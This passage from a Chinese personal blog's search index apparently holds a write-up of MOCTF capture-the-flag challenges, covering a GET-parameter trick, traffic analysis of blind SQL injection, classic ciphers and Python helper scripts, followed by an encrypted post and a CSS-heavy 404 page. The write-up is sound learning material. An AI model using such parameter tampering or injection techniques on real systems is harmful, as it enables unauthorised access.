    <content type="text"><![CDATA[春节之际，集大和理工的学长开始搞事情啦！先做个小广告 : moctf平台 MOCTF平台是厦门理工大学CodeMonster和集美大学Mokirin这两支CTF战队所搭建的一个CTF在线答题系统。题目形式与各大CTF比赛相同。目的是为两个学校中热爱信息安全的同学们提供一个刷题的平台，能够一起学习、进步。 官方的writeup 此次比赛，能力不足, web题就只做出简单的一题 是时候让你的手指锻炼一下了首先查看源代码看代码可知，只要clicks&gt;108000就会发送一个get请求，如果手动点击108000，那你加油哦！ 直接构造 ？clicks=108001 get请求，即可看到flag 做不了web题，只能来做杂项了。 流量分析这题，应该是一台主机向另一台主机请求flag信息，只要看返回的那条信息数据包，即那第二条显眼的黑色数据包，是192.168.1.2返回192.168.1.1的应答。直接追踪流-&gt;tcp就得到flag base全家桶用了base16 、base32、base64加密，依次解密即可的flag 颜文字aaencode加密，直接在粘贴到浏览器上的控制台上运行即可得到flag 奇怪的十六进制是先转化成ascii码，在base64两次解密即可得到flag 先越过这道栅栏再说先栅栏解密，然后在凯撒解密 空word一开始改后缀为压缩包格式，没发现什么。然后把word中文件-&gt;选项-&gt;显示中全部都打上勾。发现横横点点，猜是摩斯密码，一个个的拼接起来，看的眼多花了，还弄错了几个，心累。 摩斯密码解密后，16进制数转化成ascii码，得到flag 一万年的爱有多久这道题压缩包被压缩了5000次，直接上py解压. import zipfile import os filename1="KIhn9j7FfG .zip" i=0 while True: filename=filename1 if(zipfile.is_zipfile(filename)): fz=zipfile.ZipFile(filename) else: print("解压完成") file=open("filename",'r') s=file.read() print(s) exit(0) for file in fz.namelist(): i=i+1 print(i) filename1=file fz.extract(file) try: os.remove(filename) except: pass Hacker!!!这道题其实就是向服务器发送一条条请求，猜解This_Is_Column_Name这个字段的值，即flag的值。观察下图两个方框的值（后面的两个方框为同一个），所以只要查看猜解这个字段第n个字符的最后一条发送的数据包，所有的位置拼接起来就是flag，做这题真的是看得眼都花了。 李华的疑惑一开始直接打开txt文档，里面全部是满满的数，什么鬼，不知道什么东西。然后用notepad++打开，是一条条以逗号间隔的数的三位数，我觉得有点像rgb,然后就百度了一下，发现可以可以用 这些数字，拼成图片。直接上Py得到解码密码。 from PIL import Image x=150 y=150 im=Image.new("RGB",(x,y)) file=open("pa.txt") for i in range(0,x): for j in range(0,y): print(n) line=file.readline() rgb=line.split(",") im.putpixel((i,j),(int(rgb[0]),int(rgb[1]),int(rgb[2]))) im.show() im.save("flag.jpg") 进入后，发现一堆好像是base64加密的字符串，多次拆分用字符串，用base64解密不成功，只好放弃。尝试了大量的解密方法后，偶然用aes解密正确。]]></content>
      <categories>
        <category>ctf</category>
        <category>writeup </category>
      </categories>
      <tags>
        <tag>moctf</tag>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[你的忙碌是为了忙碌吗]]></title>
    <url>%2Fposts%2F3b00664c.html</url>
    <content type="text"><![CDATA[请输入文章密码！ U2FsdGVkX19S84ET0WxFvZ/pbgjlDlN27HTlWf77A3ecspeAG3ztCzUUFlj/VsM8qZ1d2QBVfhKViK9rl3/tY2KZ6EHZWtdBYoB7JNvTQ/cNgbibPfsVVpckwyNbbAj9LhKJF5PKU+SqYV7iXbob9UWcWGquzGAUHuWWm9yZANZ1en+5H0KiHm88XhITsS1dHer78JCuejapIaCYZlOIt92ct72Iew0xQDgOQ+cNXJ/eTKdcbGqjykZW9z5QVoVSAOR35EpeHFAaggOuulyhMRBAlORY6TiFwsDksxgPRCaUcDLeen9PDA7ce+YnUIiY+8OIelov5tHvXzIpb1JeYvthFT7PvRIitTkX3WnQkEqCTQdko8B1ngg7Xe/C2/ZRxPJskve/uT6/BL4iBwdu8mnMsZYTT7Hpy+bCLPVzdPRJQ4/PGiRZx1bWmi1YOlfKo6ZqlinmVNPqqZ2Zn3pa1Mf8rXjmAMGGjd1JfIbcMUEaOLppJQxDplGK/P1+ogSzznDAl+Pz5RGfw7DzVsGaN/jYJAUwPdd6sr3Nb8wjKhQLxZp3J8wuJQoIl8lupTAIDFn9eo03BQFpup60nY9Abj4Ih4CJmKSoPf/ISLWD2bL2tKkBdya8pyKaCtLM241sZmElp/fhRdNpC4lY2yxu8gEDsiIdDGw4BZvWCTQBmkKWdHVOp4arBau3ShFT8cz0PdBVyTvwqMCII2bYWE3IL7EoAnErPgE6+kHHwhGjyIpMg/jCnY/Q3io3EtgqXLszd4uRL3E2kcX3D/DwSpp3BiJTcf2yA7qJ2HFTWtfZD1KvocTnznfgl9v96dOyXe6JxQ373sxyqtlwGIJgH2FCLFq0po5AbB8B2v/fSzR3uPDQdFnL8b3wP4zH9obCLdCRBMbPcugYd31sdJd2uTx0ke7ccTZDizEHhk6eqONrtcO+rPrwa3PGDqd8IQ5TwArIerAQvmI4L3eZfurnkcdDpKaVLJOB+qUvnNrLaIPB/d/Kz1/gPt9JHRC3vkv5D45BsXfLE8ITGiPBnY+PXmLt0HDd9UTngUNHS3BSOjRRtkEaM9MbA2i17Jj9CWcXd0tf9AvH1sfQ6Z+N+0qkVw3R+wB2HyRZbgYSrgq880qa83EObRklKqdEIa9zhdY/VW1DjwdsJZ7FJtPgRgptNzfHbd6ml0MGivw45fAdXDEsAj4jQujrOnAfVpDqv+bEognCFHkmId+pq7LEY6Sn49WRcQGD5fCQI1H55fCf7e6TNkg+S03BPKmY+vXayugnTqBW2n1xeMlUKv71mnDF7zu9MO1Xcuah2ZOxWnyomf/fPDyFoHTJSa3WMpfahIl0+UYYjeBKB5A5ef9n3QSu6kY4f2zDerYf+ZZbfPQUQCknEIu1jBwokeIXlARWlZeahqVRB1jHT2jsEsNs8hZasSGQAv5kdA576dTbizg6TS2/zLnpodXckiyniq/OldBSUklnhRbBzDPS1tjYqabnb3ns6oi1k7EmNcaGfPMXoU+WFVDgqLxNWoH2HMKWnb8hehtbeZuQ/m/5HqY/fSCjivp7e6CQHzbOWO9Ev99gSTNiFhyfT1ieUN+umgSnJEtrlbntEczoSRJt2Gt9yr0O46a5vcjaq+VEjb7k2FgC0V5iET+OAoO0XWAhTrUvxzFtPeSAI4BJFXGGYsjAC9t2ZVaC2B+eYwLhwAzaDmYjz3A9GjyXr1OHrenIFk0JbIJXyEE/PcWaYXmPthT0Q1qxhfQWYxEqO3n9UMJiKE4vOYcNFxMDXOYqCjalr/+P/+cB2BUzi1o57W7UykvyI4T/TC0mnW1bhQu6If0wOvet9qP+J09IKj+bMQ3ZVPX4qwjp68Baa/FIspp8uF/jRf46QaoBqvYgUXOPPwq3tH5VkuUeVIv7TNTVI7iS34lTERdkLsy5ibOleiaMYecqtGMvmI8xmWx4kQ8caSp3GPCjvSHCTreC5r99TOSa/MMfFhQzGnu6iyJITkJ6KR0fENeZ24/7GiKxwU5AhAGQlCsoulW0Hj7fGckL9wzW2aJlk6FmHvG3K0Jg27iXiOkxrsZRJtUgWEl5RsWN4+xpCatPtZ2tQDtFlvlcelJruV1+zEcr7Y7XQdB3hQtNkKkVDhJ7JiMMR+3PDuZ85xe4Sz4JYY9cIrqo0vceQczljIiGPRheFkc+LcdAghn47UK1tQ/4uyNHlszQIcvZ47HNTK+r52pRn5wRUbRAKVQh9/vI6/0ag7+AMRTPSeS6Wj0ZfsR4CppI5Dmn9PoQsM+ol23jcItigyGjoRB1MrfYdBM4xAW6RieuGZVkjbUAySl4z1bn5Wy182Y4/42ppcnNYoIefYutXl5X0DLtMl82j4A+dp9fMphYDrywJqk6W25bGg5h47VeZUGrDej+CLiV4ght1CyfQWF7/m9JqlVq8iUfrFzS4Y1dT7eXpAMGj62/8H4BKD1veCmV8enrIU3slUffmDM5rILwWql2zaFbDClfhQ5A7a24bw10y8gd0vMipue1bk7nU7pi4iEIvqrkPEBTmhLGcDwDihXtFfCkB4JC+cn49rayyq+GDs6Ecm0DTgkU0SUrXuotJujDrSMas4OQc3Zcgb1WhIlq3AS0SXN/uE+myuMNZ4K6Y8tjs+l7L0pj83fIJe/lAGnMchEErm20WG9UFb4lbQXMZJV3BlN+CybtIBvD/24tv8Lwo1WZpdsGqTp34k1i55XVRnmsELUC+mo/bQQv0crLRibPI8lxQEFPYoV0gPlulYXLKsyFJzUFX6icW4QHp4LiTOeOZu8gpHJIXg083ngimDocg4mvAtbCWGYkUJJSAwaG+jeKHZXM0uZgkvcSzXjrwBQgpY2wz4Qzizjuoxln0gr5g7iET3Tyv6P5uEDK/vlEHHa1kW4sA3HT/cuH71375Ft/IOq9KOlLgemMK+gFAMz1cio6wghTWxI6vFnbixH3r/hIfL/zRQktM2wF6nUJtFK1/XnCsfoYi1/MalzjaJGfv1hCayXR5sqWgwAS2F4Y7u5xyWt8OZiagiWBdcv4jBAfrziLl4R5ketiW7eZ+MJRFzErrWukum6Ecr2j/tj20tXSPzVh2JleHB4YKCg2bSJ3QgXUI2d3TYhyhCgq4zcv2aPQL61h12mK563+H3/l96i9dpfHFu1rZuAkiAHALb1VAzYeJDJKZLZ/Ukpr/rR6otZBL7yQWagjsWq7QG0ZQXc9qFRjBxFHB+WCjnr5igQBXVK+9r/uvJEtNJ9wbU9DGvQ2ToaSNek3gtqCJ/ACdJDlbdZPbOCb9ZVbpyMZcMeR6aQs1x8Pk8ekv+DMSR8GpprrJkkNVbkigFqEyIu2fZouhMXUpDcVEn2UzDWValbiBEdIAR+4j4lrjvCSesyl6f/39XAzd4geRy80zY1ulOQqwvMW+ib5aAts2xzVwhaJB63GH2sGnNc1kBRFceMinvQzLacCyR1J32JtHP/xi63h85774pCR8YFaCbn804xCaLJ2nA221ADfl7CkLryOcQ52sbBo6BJTCI3SoVRfxE5wPUjnUFp0dOWuCK256S8N0tV/yFhSBsI8PmDkuJxmicjc76K2LG9Q0ll4JhDQm+Gs1CM2t2CiCzJqBrWUy2kdJ0kMPTQp411E/MIi2g8vmPUdxFuu62dI1iSLOHlOy5TohGYAmcGsJWN0G5NBKHfRcLNti+ojoBplRCo2twAPDwKR//7raKVIXwf+9rmyGzzIuNG68MpcG2lTHcu3UVDtqlHlNol8vDm6qNLK9fW5dthB+o4+weSYeG9MBgEB+bR/1WaianqVeBv+Wd2hfmPXCY5Jwnua9i0zGyRP0Bo821KNT04LXnMA01gAGj3C//AGbxY6XBB7bigXOrVW/flfYEyEXEmvCvELJj96igOaXQmK4jR00o9DqhWTsgC05d7OacNFJcUWIKtO56ZDUNhdp59tuZ8EskRdE9QTVOdzAO5Bw07apnZZ+uRb7x2eXot0KpCDY3aZY3MP4ncl869h1k22L7ewDaw2Jzcu2kDAawKchm1nBzDF4kW+tgOfMBYEak5pQIa31Znk1pagKzGv+pVqBv4eVm+3W+XNB/VCGB6enPLe9VMPN/oH8KqbUOKwP67NdvYrKLtvtchSg4zpnzHHCTNp5O8FcqMFSxTZQxhKN1xdveoaIdqb5LLbHz4oM93GgOPu/z2XgA0R6K02mwudCczMM+FbKC3XGOpPBa9VXfy+jk1S/QlOv6aRep4ZKsWie0fsYDC/fgxnlZ/j0Ds76Da2Oks891tQeUAFcVOB476pvTgb1nCuUESTaHxaKmCeB7RwUIrSg3PHlA0UNsyIw11wUALItx6twO/Au7mJELFR6QCafMXrfDiaI21ocrc+acOBXIl9MUBBsJ2hujfN6JpN5kkxGz/wGAAt3CqVAsCyTVt9EC5JwZEfnK9fBh6cYVEbQDiBTfx4fmVSrxjn4DkEARwjigJgMMo0V3u2ZVQCLgth6YNofAwmjeLk1FiClIg0XQ67DyBkBMT6w2Vjg7SFB1ImA6pnK35vnpdNEg9WZKbVPxuuZvW/9hXY//bl3qY7S0KO09CitbjowFQvEi8tcflFrF1vDEi7bp7ulsmVOpJgR9/MoG0CB9o6riTWMj0YawnAiUnmlRWmE6jrorgL8oMR0DinGdI4MlOSthTBqYnJqa6gglxH/SSqH4JGQU0J3B8a+45hHKVbCjtnX/LlFWShfL1hOtC4ff4QY3998+Wy+j71sbe6b8YZomXfK+IUih5LPTk5XeSddLdTLnaa8QhvQ9PQHrVApJLa+YIGHsLqECDqhBzd+dVlNOhFBGYHWPag1e3xHKXiG19rtLhCcOtSrGlban/kkNno99/nHX4v3ybgnzWPpkDtownatenJvALlaflgoTDnRkYzFqUVe9sMF9ZFs98aIj2qFCg6L+TcCrq2IUR8Y3qdhuZaanpfPycXksenq5IJj18DDioYJ+8t5GFiTyFDA1v4py8cthrZZ7BR93uPAmDahJ4OWQk78LJSzRw4qPHtjtgKVImbgXuIRBIfKpPq1lix3bA/CD6/k6BuHx0zT3my3vr6Qh7/8+LimKsP9fbXecEasfc+Pewmwo0KoQYCQroyfw9rmzDbYx4R7C/4U0Hby1J/IkQsPYX4I6tEyjirCK6hu4OoH/hOLJSnrp8LOPjcuqfDs/EfaGQbusvcrMnMT5U7Dkii7r8u+piNVOPEdCTamLUrvhDGcYvECkxP+3PzdjenO0mlbWxszrdl4WTTt574Z10Fikk/QRTyUDt95Wn8pLvKTgW6P3ljCCK5m4HugQa3A1yN5uPS40T/5AgbRoxur0G1pB9Inr6ostEytrkUAk6aFP6CquJERgAp60p3wgZtjT2F+NdB+/0XHGesxYjjh8yWP38TYVHJr/L5gmVXRVYEWZPjN9GdpcolWukjzAchb8VEz0DUHNCvDb0lEMx1iValrG/Ql+EV1BiGiErRbdXh13TKkUp80ViEudI4bZw37Rko]]></content>
      <categories>
        <category>life</category>
      </categories>
      <tags>
        <tag>life</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>%2F404.html</url>
    <content type="text"><![CDATA[哎呀！访问错误 .adbase-ctn { background: url(images/loading.png) center center no-repeat; } #NIE-copyRight a { text-decoration: none; } #NIE-copyRight a:hover { text-decoration: underline; } #NIE-topBar .hide, #NIE-topBar-include .hide { display: none!important } .NIE-topBar-logo, .NIE-topBar-arrIcon i, #NIE-topBar-menu span, .NIE-topBar-hot, .NIE-topBar-1st, .NIE-topBar-new, .NIE-topBar-btn { background: url(images/sprite-w_7fc7459.png) no-repeat } .NIE-topBar-arrIcon { position: relative; top: 4px; width: 16px; height: 16px; display: inline-block; background-color: #fff; overflow: hidden } .NIE-topBar-arrIcon i { width: 9px; height: 4px; float: left; margin: 6px 0 0 4px; background-position: -103px -101px; display: inline-block; -webkit-transition: all .2s ease 0s; transition: all .2s ease 0s } #NIE-topBar, #NIE-topBar-include { position: relative; z-index: 9999; min-width: 1000px; height: 40px; background: #333; line-height: 24px; font-family: "Microsoft YaHei", simSun, "Lucida Grande", "Lucida Sans Unicode", Arial } #NIE-topBar *, #NIE-topBar-include * { font-size: 12px; font-style: normal } #NIE-topBar a, #NIE-topBar-include a { color: #999; text-decoration: none } #NIE-topBar a:hover, #NIE-topBar-include a:hover { color: #fff } #NIE-topBar ul, #NIE-topBar li, #NIE-topBar-include ul, #NIE-topBar-include li { margin: 0; padding: 0; float: left } .NIE-topBar-main { position: relative; z-index: 9999; width: 1000px; margin: auto } .NIE-topBar-logo { width: 133px; height: 44px; display: block; float: left; margin-top: 6px; background: url(images/logo_b5525b7.png) no-repeat } #NIE-topBar-news { position: absolute; z-index: 13; width: 420px; height: 54px; left: 125px; padding-left: 18px; padding-top: 0; overflow: hidden; display: block } #NIE-topBar-news.NIE-topBar-news-hover { height: 250px; overflow: visible; border-color: #1f1f1f } #NIE-topBar-news a { width: 960px; display: block; height: 0; overflow: hidden; z-index: 1; -webkit-box-shadow: 0 2px 4px rgba(0,0,0,.2); -o-box-shadow: 0 2px 4px rgba(0,0,0,.2); -moz-box-shadow: 0 2px 4px rgba(0,0,0,.2); box-shadow: 0 2px 4px rgba(0,0,0,.2) } #NIE-topBar-news-close { position: absolute; top: 63px; right: -380px; display: block; width: 32px; height: 32px; overflow: hidden; background: url(images/sprite-w_7fc7459.png) no-repeat -9999px -9999px; text-indent: -9999px; z-index: 2 } #NIE-topBar-news.NIE-topBar-news-hover .NIE-topBar-abc-s { visibility: hidden } #NIE-topBar-news.NIE-topBar-news-hover a { position: absolute; z-index: 2; left: -132px; top: 55px; height: auto } #NIE-topBar-news.NIE-topBar-news-hover a img { display: block } .NIE-topBar-mid { position: absolute; z-index: 2; right: 230px; width: 385px; text-align: right } #NIE-topBar .NIE-topBar-mid a, #NIE-topBar-include .NIE-topBar-mid a { line-height: 40px; padding: 0 12px; color: #fff; display: inline-block } #NIE-topBar .NIE-topBar-mid a:hover, #NIE-topBar-include .NIE-topBar-mid a:hover { color: #ca0b0b } #NIE-topBar-menu { position: absolute; z-index: 1; top: 0; right: 0; color: #999; width: 1000px; height: 40px; overflow: hidden; -webkit-transition: height .3s ease 0s; -o-transition: height .3s ease 0s; -moz-transition: height .3s ease 0s; transition: height .3s ease 0s } #NIE-topBar-menu span { position: absolute; width: 108px; padding: 8px 0 12px; height: 20px; line-height: 14px; right: 106px; background-position: 0 -28px; background-repeat: repeat-x; padding-left: 15px; color: #fff; display: inline-block; overflow: hidden } #NIE-topBar-menu .NIE-table { position: absolute; top: 40px; left: 0; background: #262626; border-collapse: collapse; overflow: hidden; width: 100% } #NIE-topBar-menu .NIE-table a { width: 105px; margin-left: 6px; line-height: 24px; display: inline-block } #NIE-topBar-menu .NIE-table a.long { width: 125px } #NIE-topBar-menu .NIE-table ul { list-style: none } #NIE-topBar-menu .NIE-table .NIE-nav { width: 100%; position: relative } #NIE-topBar-menu .NIE-table .NIE-nav li { width: 110px; float: left; border-right: 1px solid #eee; vertical-align: top } #NIE-topBar-menu .NIE-table .NIE-nav .mobi { position: absolute; left: 248px; -webkit-transition: all .3s ease-out } #NIE-topBar-menu .NIE-table b { line-height: 39px; color: #bc2e2e; display: block; width: 100%; height: 39px; font-size: 14px; text-indent: 20px; background: #f7f7f8; overflow: hidden; clear: both } #NIE-topBar-menu b i { margin-left: 5px; padding: 2px 4px; color: #9b9b9b; font-style: normal; background: #111; display: inline } #NIE-topBar-menu .NIE-list { float: left; overflow: hidden; width: 100%; height: 410px } .w1680 #NIE-topBar-menu .NIE-list { height: 450px } #NIE-topBar-menu .NIE-list li { border-right: 1px solid #eee; height: 392px; float: left; padding: 10px 0 0 14px; overflow: hidden } #NIE-topBar-menu .NIE-list .news { position: absolute; background: #fdfefe; left: 421px; -webkit-transition: all .3s ease-out; top: 39px } #NIE-topBar-menu .NIE-list .hot { position: absolute; background: #fdfefe; left: 263px; -webkit-transition: all .3s ease-out; top: 39px } #NIE-topBar-menu .NIE-list .hot a { width: 125px } .w1680 #NIE-topBar-menu .NIE-list .news div div { margin-right: 8px } #NIE-topBar-menu .NIE-list .news .long-news { width: 133px; float: left } #NIE-topBar-menu .NIE-list .news .long-news a { width: 125px } #NIE-topBar-menu .NIE-list .news .short-news { float: left; width: 106px } #NIE-topBar-menu .NIE-list .news .mini-news { width: 90px; margin-right: 0; float: left } #NIE-topBar-menu .NIE-list .news .mini-news a { width: 82px } #NIE-topBar-menu .moreAni .NIE-list .news { left: 189px; width: 651px!important; -webkit-transition: all .3s ease-out } #NIE-topBar-menu .moreAni .NIE-list .hot { left: 30px; border-left: 1px solid #eee; box-shadow: -1px 0 1px #eee; -webkit-transition: all .3s ease-out } #NIE-topBar-menu .moreAni .NIE-nav .mobi { left: 30px; width: 823px!important; border-left: 1px solid #eee; box-shadow: -1px 0 1px #eee; -webkit-transition: all .3s ease-out } #NIE-topBar-menu .NIE-list .NIE-topBar-more { width: 20px; height: 95px; height: 92px\9; display: block; position: absolute; right: 0; top: 124px; font-size: 12px; color: #fff; background: #bc2e2e; padding-left: 10px; line-height: 14px; padding-top: 7px; border-top-left-radius: 2px; border-bottom-left-radius: 2px } #NIE-topBar-menu .NIE-list .NIE-topBar-more:hover { opacity: .8 } #NIE-topBar-menu .moreAni .NIE-topBar-more { width: 21px; height: 23px; border-radius: 2px; right: 9px; top: 163px; padding-left: 4px; padding-top: 2px; height: 20px; height: 18px\9 } .w1680 #NIE-topBar-menu .NIE-list .NIE-topBar-more { display: none } #NIE-topBar-menu .NIE-table a em { font-weight: 400; display: block; line-height: 24px } .NIE-topBar-1st { background-position: right -267px } .NIE-topBar-hot { background-position: right -144px } .NIE-topBar-new { background-position: right -206px } #NIE-topBar-menu.NIE-topBar-menu-hover .NIE-table { display: block } #NIE-topBar-menu.NIE-topBar-menu-hover { height: 505px; opacity: .9; -webkit-transition: height .4s ease 0s; -o-transition: height .4s ease 0s; -moz-transition: height .4s ease 0s; transition: height .4s ease 0s } a.NIE-topBar-btn { width: 105px!important; height: 18px; line-height: 18px!important; margin: 5px 0; display: inline-block; padding-left: 0!important; background-position: 0 -338px; text-indent: 25px; color: #bc3030!important } a.NIE-topBar-btn:hover { } .NIE-topBar-ad { height: 40px; left: 50% } .NIE-topBar-main.w1680 { width: 1260px } .NIE-topBar-main.w1680 #NIE-topBar-menu { width: 1260px } #NIE-topBar-news { height: 54px } #NIE-topBar .NIE-topBar-menu-hover, #NIE-topBar-include .NIE-topBar-menu-hover { z-index: 8 } .NIE-topBar-ad-big { position: absolute; top: 0; left: 0; z-index: 10; height: 0; overflow: hidden; text-align: center } #NIE-topBar-menu { z-index: 7; height: 55px } .NIE-topBar-mid { z-index: 12; width: 250px; right: 230px; width: 536px } .NIE-topBar-logo { position: relative; z-index: 13!important } #NIE-topBar, #NIE-topBar-include { height: 55px; background: #fbfbfb } .NIE-topBar-logo { margin-top: 5px } #NIE-topBar-menu .NIE-table { top: 55px; background: #fdfefe; border-top: 1px solid #ececec; margin: 0 } #NIE-topBar-menu span { background: 0 0; color: #bc2e2e } #NIE-topBar-menu .NIE-table { display: none } #NIE-topBar-menu .NIE-table .last_td, #NIE-topBar-menu .NIE-table .last_th { border-right: 0 } #NIE-topBar a, #NIE-topBar-include a { color: #626262 } #NIE-topBar-menu b i { background-color: #fbfbfb; color: #bc2e2e } #NIE-topBar-menu p { padding: 0; margin: 0; margin-left: 6px; line-height: 24px; margin-bottom: 4px; font-weight: 700; color: #626262 } #NIE-topBar a:hover, #NIE-topBar-include a:hover { color: #bc2e2e } #NIE-topBar-menu.NIE-topBar-menu-hover { opacity: .95 } #NIE-topBar-menu .NIE-table * { font-size: 12px } #NIE-topBar-menu.NIE-topBar-menu-hover span { border-bottom: 3px solid #bc2e2e; background-color: #F3F3F3; background-image: -webkit-linear-gradient(top, #F3F3F3 0, #FEFEFE 52px); background-image: linear-gradient(top, #F3F3F3 0, #FEFEFE 52px) } #NIE-topBar-menu span { height: 25px; height: 26px\0; width: 108px; padding-top: 15px; padding-top: 14px\0; transition: background ease-in-out .33s; z-index: 20 } #NIE-topBar .NIE-topBar-mid a, #NIE-topBar-include .NIE-topBar-mid a { color: #333; line-height: 52px; transition: background ease-in-out .33s; *line-height:55px } #NIE-topBar .NIE-topBar-mid a:hover, #NIE-topBar-include .NIE-topBar-mid a:hover { color: #bc2e2e!important; border-bottom: 3px solid #bc2e2e; background-color: #F3F3F3; background-image: -webkit-linear-gradient(top, #F3F3F3 0, #FEFEFE 52px); background-image: linear-gradient(top, #F3F3F3 0, #FEFEFE 52px); *border-bottom:0 } .NIE-topBar-right { position: absolute; right: 0; top: 0; display: block; width: 100px; height: 55px; overflow: hidden; z-index: 9 } .NIE-topBar-right a { color: #333!important; width: 100%; text-align: center; display: inline-block; float: left; line-height: 52px; transition: background ease-in-out .33s; -webkit-transition: background ease-in-out .33s } .NIE-topBar-right a:hover { color: #bc2e2e!important; border-bottom: 3px solid #bc2e2e; background-color: #F3F3F3; background-image: -webkit-linear-gradient(top, #F3F3F3 0, #FEFEFE 52px); background-image: linear-gradient(top, #F3F3F3 0, #FEFEFE 52px); *border-bottom:0 } .NIE-topBar-right a.fadeUp { opacity: 0; -webkit-transform: translate3d(0, -70%, 0); -webkit-transition: all ease-in-out .5s; transform: translate3d(0, -70%, 0); transition: all ease-in-out .5s } .NIE-topBar-right a.none { opacity: 0; -webkit-transform: translate3d(0, 70%, 0); transform: translate3d(0, 70%, 0) } .NIE-topBar-right a.fadeUp2 { opacity: 1; -webkit-transform: translate3d(0, 0, 0); -webkit-transition: all ease-in-out .5s; transform: translate3d(0, 0, 0); transition: all ease-in-out .5s } 未找到您访问的页面， 但我们找到了 您儿时热爱的画面。]]></content>
  </entry>
  <entry>
    <title><![CDATA[关于]]></title>
    <url>%2Fabout%2Findex.html</url>
    <content type="text"><![CDATA[大家好，我是XXX。欢迎来到我的个人技术博客。 这里用markdown写下你的简介，就跟平时写md一样就可以了。]]></content>
  </entry>
  <entry>
    <title><![CDATA[读书]]></title>
    <url>%2Freading%2Findex.html</url>
    <content type="text"></content>
  </entry>
</search>
